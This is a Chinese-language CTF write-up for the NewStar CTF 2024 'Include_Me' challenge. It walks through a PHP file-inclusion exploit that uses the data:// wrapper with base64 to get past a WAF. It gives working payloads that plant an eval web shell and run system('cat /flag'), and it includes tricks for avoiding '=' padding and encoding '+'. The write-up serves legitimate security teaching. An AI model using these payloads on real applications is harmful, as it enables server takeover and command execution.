---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
# Include_Me

打开题目5s后会自动跳转搜索php伪协议

![PHP代码部分](/assets/images/wp/2024/week3/include-me_1.png)
![跳转结果](/assets/images/wp/2024/week3/include-me_2.png)

要防止跳转，使用GET传入iknow的值即可 eg:（?iknow=1）

进入正题

![源码](/assets/images/wp/2024/week3/include-me_3.png)

我们使用GET传入phpinfo的值后可验证远程文件包含漏洞的必要条件满足

![phpinfo](/assets/images/wp/2024/week3/include-me_4.png)

接着就是绕waf，这里使用的是data协议加base64加密的组合拳

payload1

```plaintext
iknow=1&me=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUW2NtYXNdKT8%2b
<?php @eval($_POST[cmas])?>
（POST方式传入cmas来命令执行即可）
```

```plaintext
payload2
iknow=1&me=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/PiAg
<?php system("cat /flag");?>
```

这里对我们需要注意的是

- base64加密后的字符串不能带有=，因为会被waf，这时我们可以通过在明文payload的最后加上空格再进行加密，最后得到无=号的密文payload即可
- 若密文最后是+号的话，我们在GET传参必须将其编码为%2b，不然+会被视为空格
